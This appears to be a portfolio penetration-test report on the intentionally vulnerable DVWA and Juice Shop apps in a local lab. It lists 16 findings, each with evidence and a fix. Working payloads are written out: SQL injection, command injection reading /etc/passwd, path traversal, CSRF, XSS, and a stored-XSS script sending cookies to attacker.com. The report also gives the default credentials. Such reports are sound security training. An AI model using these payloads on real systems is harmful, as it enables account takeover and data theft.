# Web Application Security Assessment Report

**Assessment Type:** OWASP Top 10 Manual Penetration Test  
**Target Applications:** DVWA (Damn Vulnerable Web Application), OWASP Juice Shop  
**Environment:** Local Docker containers (non-production lab)  
**Assessment Date:** June 15, 2024  
**Assessor:** WaiLinOo  
**Classification:** Confidential — Lab / Portfolio  

---

## Executive Summary

A manual web application security assessment was performed against two intentionally vulnerable applications: DVWA and OWASP Juice Shop. The assessment covered all OWASP Top 10 (2021) categories using Burp Suite as the primary proxy and testing tool, supplemented by automated scanning with Nikto and SQLmap and a custom Python fuzzer.

**16 vulnerabilities were identified** across 8 of the 10 OWASP Top 10 categories. The overall risk posture of both applications is critical — both are intentionally vulnerable for training purposes, but the findings accurately represent the class of vulnerabilities commonly seen in real-world assessments.

| Severity | Count |
|----------|-------|
| Critical | 3 |
| High | 6 |
| Medium | 5 |
| Low | 2 |
| **Total** | **16** |

---

## Scope

| Target | URL | Notes |
|--------|-----|-------|
| DVWA | http://localhost | Security level: Low |
| OWASP Juice Shop | http://localhost:3000 | Default configuration |

**In scope:** All functionality accessible via the web browser without admin credentials (with the exception of the admin bypass finding).  
**Out of scope:** Network-layer attacks, denial of service, host OS exploitation.

---

## Methodology

Testing followed the OWASP Testing Guide v4.2 methodology:

1. **Reconnaissance** — Manual browsing with Burp proxy active, Nikto scan, spidering HTTP history
2. **Vulnerability identification** — Manual payload testing per OWASP Top 10 category
3. **Exploitation** — Confirmed exploitability with working proof-of-concept for each finding
4. **Automation** — SQLmap to confirm SQL injection, custom fuzzer for regression coverage
5. **Documentation** — Each finding recorded with evidence, impact, and remediation

---

## Findings Summary

| # | Title | App | Severity | OWASP Category | CVSS v3.1 |
|---|-------|-----|----------|----------------|-----------|
| 1 | SQL Injection — UNION-based extraction | DVWA | Critical | A03 Injection | 9.8 |
| 2 | SQL Injection — Login bypass | Juice Shop | Critical | A07 Auth Failures | 9.8 |
| 3 | Command Injection — Remote Code Execution | DVWA | Critical | A03 Injection | 9.8 |
| 4 | Stored Cross-Site Scripting | DVWA | High | A03 Injection | 8.8 |
| 5 | Local File Inclusion | DVWA | High | A03 Injection | 7.5 |
| 6 | IDOR on Basket API | Juice Shop | High | A01 Broken Access Control | 7.5 |
| 7 | Admin panel accessible without auth | Juice Shop | High | A01 Broken Access Control | 7.3 |
| 8 | Passwords stored as unsalted MD5 | DVWA | High | A02 Crypto Failures | 7.5 |
| 9 | Missing CSRF tokens | DVWA | Medium | A08 Integrity Failures | 6.5 |
| 10 | Reflected Cross-Site Scripting | DVWA | Medium | A03 Injection | 6.1 |
| 11 | DOM-based Cross-Site Scripting | DVWA | Medium | A03 Injection | 6.1 |
| 12 | No rate limiting on login | Juice Shop | Medium | A07 Auth Failures | 5.3 |
| 13 | Verbose SQL error messages | DVWA | Medium | A05 Misconfiguration | 5.3 |
| 14 | Default credentials accepted | DVWA | Medium | A05 Misconfiguration | 5.3 |
| 15 | No logging on failed login attempts | DVWA | Low | A09 Logging Failures | 3.7 |
| 16 | Outdated server version in headers | DVWA | Low | A06 Vulnerable Components | 3.1 |

---

## Detailed Findings

---

### Finding 1 — SQL Injection: UNION-based Data Extraction

**Severity:** Critical  
**CVSS v3.1 Score:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)  
**OWASP Category:** A03:2021 — Injection  
**Application:** DVWA  
**Endpoint:** `http://localhost/dvwa/vulnerabilities/sqli/?id=`

**Description**

The `id` parameter is directly concatenated into a MySQL query with no parameterisation or input sanitisation.

**Evidence**

```
' ORDER BY 2-- -    → OK
' ORDER BY 3-- -    → Error (confirmed 2 columns)

' UNION SELECT null,database()-- -
→ Response: dvwa

' UNION SELECT user,password FROM users-- -
→ admin | 5f4dcc3b5aa765d61d8327deb882cf99  (= "password")
  gordonb | e99a18c428cb38d5f260853678922e03 (= "abc123")
  pablo | 0d107d09f5bbe40cade3de5c71e9e9b7   (= "letmein")
```

Confirmed with SQLmap (`--dbs --batch`) — full database enumeration successful.

**Impact**

Full read access to the database. Credential extraction, potential OS escalation via `--os-shell`.

**Remediation**

Use parameterised queries (prepared statements):
```php
$stmt = $mysqli->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->bind_param("s", $id);
$stmt->execute();
```

---

### Finding 2 — SQL Injection: Login Bypass

**Severity:** Critical  
**CVSS v3.1 Score:** 9.8  
**OWASP Category:** A07:2021 — Identification and Authentication Failures  
**Application:** OWASP Juice Shop  
**Endpoint:** `POST http://localhost:3000/rest/user/login`

**Evidence**

Email field: `' OR 1=1-- -` / Password: anything → Logged in as admin@juice-sh.op immediately.

**Impact**

Unauthenticated access to any account including admin. Combined with Finding 7, grants full administrative access.

**Remediation**

Parameterise the login query. Implement account lockout (see Finding 12).

---

### Finding 3 — Command Injection: Remote Code Execution

**Severity:** Critical  
**CVSS v3.1 Score:** 9.8  
**OWASP Category:** A03:2021 — Injection  
**Application:** DVWA  
**Endpoint:** `POST http://localhost/dvwa/vulnerabilities/exec/`

**Evidence**

```
Input:  127.0.0.1; id
Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)

Input:  127.0.0.1; cat /etc/passwd
Output: [full /etc/passwd printed in response]
```

**Impact**

Full RCE as the web server process. Attacker can establish reverse shell, read arbitrary files, pivot.

**Remediation**

Never pass user input to shell functions. Use `escapeshellarg()` if shell calls are unavoidable. Prefer native language APIs.

---

### Finding 4 — Stored Cross-Site Scripting

**Severity:** High  
**CVSS v3.1 Score:** 8.8  
**OWASP Category:** A03:2021 — Injection  
**Application:** DVWA — XSS Stored (guestbook)

**Evidence**

Submitted to guestbook (bypassed client-side maxlength via devtools):
```html
<script>document.location='http://attacker.com?c='+document.cookie</script>
```
Payload persists in DB and executes for every visitor.

**Impact**

Session hijacking of all users who view the guestbook. More dangerous than reflected XSS — no per-victim delivery required.

**Remediation**

HTML-encode all user-supplied output (`htmlspecialchars($output, ENT_QUOTES)`). Implement Content Security Policy.

---

### Finding 5 — Local File Inclusion

**Severity:** High  
**CVSS v3.1 Score:** 7.5  
**OWASP Category:** A03:2021 — Injection  
**Application:** DVWA  
**Endpoint:** `http://localhost/dvwa/vulnerabilities/fi/?page=`

**Evidence**

```
?page=../../../../../../etc/passwd          → full /etc/passwd in browser
?page=php://filter/convert.base64-encode/resource=index.php → PHP source (base64)
```

**Remediation**

Whitelist allowed page values server-side. Never pass user input to `include()` or `require()`.

---

### Finding 6 — IDOR on Basket API

**Severity:** High  
**CVSS v3.1 Score:** 7.5  
**OWASP Category:** A01:2021 — Broken Access Control  
**Application:** OWASP Juice Shop  
**Endpoint:** `POST /api/BasketItems`, `GET /rest/basket/{id}`

**Evidence**

Changed `BasketId` from own value (2) to another user's (1) in Burp Repeater:
```json
{"ProductId": 1, "BasketId": 1, "quantity": 1}  →  201 Created
GET /rest/basket/1  (with token for user 2)       →  200 OK, returns user 1's basket
```

**Remediation**

Validate basket ownership server-side against the authenticated user's session. Never trust client-supplied IDs for ownership checks.

---

### Finding 7 — Admin Panel Accessible Without Authentication

**Severity:** High  
**CVSS v3.1 Score:** 7.3  
**OWASP Category:** A01:2021 — Broken Access Control  
**Application:** OWASP Juice Shop  
**Endpoint:** `http://localhost:3000/#/administration`

**Evidence**

Logged in as regular user → navigated directly to `/#/administration` → page loaded with all user emails and reviews. The access control exists only in the Angular router (frontend) — the backend API endpoints that populate the page respond to any valid JWT.

**Remediation**

Enforce role checks server-side on every admin API endpoint, not in the frontend router.

---

### Finding 8 — Passwords Stored as Unsalted MD5

**Severity:** High  
**CVSS v3.1 Score:** 7.5  
**OWASP Category:** A02:2021 — Cryptographic Failures  
**Application:** DVWA

**Evidence**

From SQLi dump — all passwords are unsalted MD5. Cracked in seconds via crackstation.net:

| Username | Hash | Cracked |
|----------|------|---------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |

**Remediation**

Use Argon2id, bcrypt, or scrypt with automatic per-user salting:
```php
$hash = password_hash($password, PASSWORD_ARGON2ID);
```

---

### Finding 9 — Missing CSRF Tokens on Password Change

**Severity:** Medium  
**CVSS v3.1 Score:** 6.5  
**OWASP Category:** A08:2021 — Software and Data Integrity Failures  
**Application:** DVWA  
**Endpoint:** `GET http://localhost/dvwa/vulnerabilities/csrf/`

**Evidence**

PoC attack page — if a logged-in DVWA user loads this, their password changes silently:
```html
<img src="http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" width="0" height="0">
```
Fuzzer confirmed submission accepted with no Referer header.

**Remediation**

Generate random per-session CSRF token, embed in forms, validate server-side. Also set `SameSite=Lax` on session cookies.

---

### Finding 10 — Reflected Cross-Site Scripting

**Severity:** Medium  
**CVSS v3.1 Score:** 6.1  
**OWASP Category:** A03:2021 — Injection  
**Application:** DVWA  
**Endpoint:** `http://localhost/dvwa/vulnerabilities/xss_r/?name=`

**Evidence**

```
?name=<script>alert('XSS')</script>  → alert fires, tag reflected verbatim
?name=<img src=x onerror=alert(1)>  → alert fires
?name=<svg onload=alert('XSS')>     → alert fires
```

**Remediation**

HTML-encode all reflected user input. Implement Content-Security-Policy header.

---

### Finding 11 — DOM-based Cross-Site Scripting

**Severity:** Medium  
**CVSS v3.1 Score:** 6.1  
**OWASP Category:** A03:2021 — Injection  
**Application:** DVWA  
**Endpoint:** `http://localhost/dvwa/vulnerabilities/xss_d/?default=`

**Evidence**

Payload never reaches the server — injected entirely client-side via `document.write()`:
```
?default=<script>alert('DOM XSS')</script>  → alert fires
#<img src=x onerror=alert('DOM XSS')>       → fragment never sent to server, still fires
```

**Remediation**

Use `textContent` instead of `innerHTML`/`document.write()`. Sanitise with DOMPurify. Audit all JS reading from `location`, `document.URL`, `document.referrer`.

---

### Finding 12 — No Rate Limiting on Login Endpoint

**Severity:** Medium  
**CVSS v3.1 Score:** 5.3  
**OWASP Category:** A07:2021 — Identification and Authentication Failures  
**Application:** OWASP Juice Shop

**Evidence**

50 rapid Burp Intruder requests — all got consistent 401 responses with no throttling, 429, or lockout. Hydra ran at ~100 req/s sustained with no slowdown.

**Remediation**

Rate limit to max 5 attempts/IP/minute. Implement exponential backoff and account lockout. Use `express-rate-limit` or equivalent middleware.

---

### Finding 13 — Verbose SQL Error Messages

**Severity:** Medium  
**CVSS v3.1 Score:** 5.3  
**OWASP Category:** A05:2021 — Security Misconfiguration  
**Application:** DVWA

**Evidence**

Input `'` returns:
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1
```
Revealed DB type (MySQL), confirmed injection point, guided UNION payload construction.

**Remediation**

Set `display_errors = Off` in php.ini. Log errors server-side only. Return generic error pages.

---

### Finding 14 — Default Credentials Accepted

**Severity:** Medium  
**CVSS v3.1 Score:** 5.3  
**OWASP Category:** A05:2021 — Security Misconfiguration  
**Application:** DVWA, Juice Shop

**Evidence**

- DVWA: `admin / password` — login successful first attempt
- Juice Shop: `admin@juice-sh.op / admin123` — login successful first attempt

**Remediation**

Force credential change on first login. Remove/randomise built-in default accounts before deployment.

---

### Finding 15 — No Logging of Failed Authentication Attempts

**Severity:** Low  
**CVSS v3.1 Score:** 3.7  
**OWASP Category:** A09:2021 — Security Logging and Monitoring Failures  
**Application:** DVWA

**Evidence**

50 failed login attempts generated zero new log entries:
```bash
docker exec dvwa find /var/log -newer /tmp -type f
# → no output
```

**Remediation**

Log all auth events (success + failure) with timestamp, source IP, username. Alert when failure rate exceeds threshold.

---

### Finding 16 — Outdated Server Version Exposed in HTTP Headers

**Severity:** Low  
**CVSS v3.1 Score:** 3.1  
**OWASP Category:** A06:2021 — Vulnerable and Outdated Components  
**Application:** DVWA

**Evidence**

```
Server: Apache/2.4.25 (Debian)   ← released 2016, multiple CVEs
X-Powered-By: PHP/7.0.33         ← EOL December 2018
```

**Remediation**

Apache: `ServerTokens Prod` in config. PHP: `expose_php = Off`. Update to supported versions.

---

## OWASP Top 10 Coverage

| OWASP Category | Tested | Findings |
|----------------|--------|----------|
| A01 — Broken Access Control | ✓ | #6, #7 |
| A02 — Cryptographic Failures | ✓ | #8 |
| A03 — Injection | ✓ | #1, #2, #3, #4, #5, #10, #11 |
| A04 — Insecure Design | ✓ | No findings |
| A05 — Security Misconfiguration | ✓ | #13, #14 |
| A06 — Vulnerable & Outdated Components | ✓ | #16 |
| A07 — Auth Failures | ✓ | #2, #12 |
| A08 — Software & Data Integrity Failures | ✓ | #9 |
| A09 — Logging & Monitoring Failures | ✓ | #15 |
| A10 — SSRF | ✓ | No findings (no applicable endpoints) |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Burp Suite Community | Primary proxy, Repeater, Intruder |
| SQLmap | SQL injection confirmation and automation |
| Nikto | Web server misconfiguration scanning |
| Hydra | Login brute-force testing |
| fuzzer.py (custom) | Automated SQLi, XSS, CMDI, LFI, CSRF testing |
| Docker | Target application deployment |
| Firefox | Browser with Burp proxy configured |

---

## Conclusion

All 16 findings are the result of common, well-documented vulnerability classes. The three critical findings (SQL injection, login bypass, and RCE) each represent full application compromise on their own. The assessment demonstrates that automated tools alone are insufficient — DOM XSS, CSRF, and IDOR required manual analysis and were not flagged by Nikto.
